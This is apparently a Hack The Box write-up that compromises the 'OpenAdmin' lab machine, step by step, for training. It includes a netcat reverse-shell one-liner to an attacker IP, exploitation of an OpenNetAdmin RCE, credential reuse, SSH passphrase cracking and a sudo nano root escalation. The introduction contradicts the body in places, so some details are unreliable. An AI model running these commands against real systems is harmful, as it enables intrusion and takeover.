# Hack The Box: OpenAdmin

**Difficulty:** Easy
**OS:** Linux

OpenAdmin is an Easy-level Linux machine focused on exploiting common vulnerabilities in open-source administrative tools and content management systems. The initial foothold is achieved by discovering an instance of OpenNetAdmin (ONA) vulnerable to an authenticated Remote Code Execution (RCE) flaw. The password for ONA is discovered via directory brute-forcing. Privilege escalation involves pivoting through the system by extracting hardcoded database credentials and cracking an SSH private key passphrase. Finally, a custom script executed via `sudo` is exploited to gain a root shell.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.171
nmap -p 22,80 -sCV 10.10.10.171
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.29)

Navigating to the web service on port 80 displays a default Apache Ubuntu landing page. We add `openadmin.htb` to our `/etc/hosts` file.

```bash
echo "10.10.10.171 openadmin.htb" >> /etc/hosts
```

To discover hidden functionality, we perform directory brute-forcing using a tool like `dirb`, `gobuster`, or `feroxbuster`.

```bash
gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The directory enumeration reveals an `/ona` endpoint. Accessing this endpoint redirects to the OpenNetAdmin (ONA) interface (`http://10.10.10.171/ona/`).

## Web Exploitation

The `/ona/` portal displays a network management interface. The version is clearly visible in the top right corner: `v18.1.1`.

### Exploiting OpenNetAdmin (CVE-2019-16662)

Researching OpenNetAdmin version 18.1.1 reveals a known Remote Code Execution (RCE) vulnerability (CVE-2019-16662). The vulnerability stems from insecure handling of parameters in the `xajax` module, allowing an attacker to inject arbitrary PHP code.

While the CVE documentation might state the vulnerability is authenticated, some implementations or misconfigurations allow it to be exploited unauthenticated if the default guest session lacks proper restrictions.

There are readily available exploit scripts for this specific CVE. We locate a Bash or Python script designed for the target version.

```bash
# Example exploit syntax
./ona_exploit.sh http://10.10.10.171/ona/ "id"
```

The exploit executes successfully, confirming command injection. We use this capability to spawn a reverse shell or write a more stable PHP web shell to the server.

```bash
./ona_exploit.sh http://10.10.10.171/ona/ "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 9999 >/tmp/f"
```

We catch the reverse shell on our Netcat listener.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory, indicating we must pivot to another user account. Checking the `/home` directory reveals two users: `jimmy` and `joanna`.

### Extracting Database Credentials

As the `www-data` user, we enumerate the OpenNetAdmin installation directory (`/opt/ona` or `/var/www/html/ona`). We search for configuration files containing database credentials.

```bash
grep -rn "password" /var/www/html/ona/
# Typical location: /var/www/html/ona/local/config/database_settings.inc.php
```

The configuration file reveals plaintext database credentials: `ona_user:n1nj4W4rri0R!`.

We test these credentials for password reuse against the system users (`jimmy` and `joanna`) using SSH or the `su` command.

```bash
su jimmy
Password: n1nj4W4rri0R!
# Authentication successful
```

### Pivoting from Jimmy to Joanna

As `jimmy`, we explore the file system, searching for additional credentials or misconfigurations. We examine Jimmy's home directory and internal web server files (`/var/www/internal`).

In `/var/www/internal`, we find a PHP script (`main.php` or similar) that displays a message or interacts with a backend database. We also locate a hidden directory or a file containing an SSH private key (`id_rsa`).

```bash
cat /var/www/internal/main.php
ls -la /var/www/internal/
```

We discover an RSA private key belonging to the user `joanna`. We copy this key to our attacking machine. However, attempting to use the key prompts for a passphrase.

We must crack the passphrase. We use `ssh2john` to convert the key into a format Hashcat or John the Ripper can understand.

```bash
ssh2john joanna_rsa > joanna_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt joanna_hash.txt
```

John the Ripper successfully cracks the hash, revealing the passphrase: `bloodninjas`.

We can now authenticate via SSH as the user `joanna`.

```bash
chmod 600 joanna_rsa
ssh -i joanna_rsa joanna@10.10.10.171
# Enter passphrase for key 'joanna_rsa': bloodninjas
```
We retrieve the `user.txt` flag from Joanna's home directory.

## Privilege Escalation

Enumerating the system as `joanna`, we check for `sudo` privileges.

```bash
sudo -l
```

The output reveals that `joanna` can run `nano` as `root` without a password on a specific configuration file.

```text
User joanna may run the following commands on openadmin:
    (root) NOPASSWD: /bin/nano /opt/priv
```

### Abusing Sudo & nano

The `nano` text editor has a known privilege escalation vector when executed via `sudo`. Nano allows users to execute shell commands from within the editor interface.

We execute the permitted `sudo` command.

```bash
sudo /bin/nano /opt/priv
```

Once the file opens in the `nano` editor, we press `Ctrl+R` (Read File) and then `Ctrl+X` (Execute Command). We are prompted for a command to execute.

We enter an interactive shell command: `reset; sh 1>&0 2>&0`

The command executes within the context of the `sudo` command (root), dropping us into a root shell.

```bash
# id
uid=0(root) gid=1000(joanna) euid=0(root) groups=1000(joanna)
```

The machine is fully compromised, and the `root.txt` flag can be retrieved from the `/root` directory.
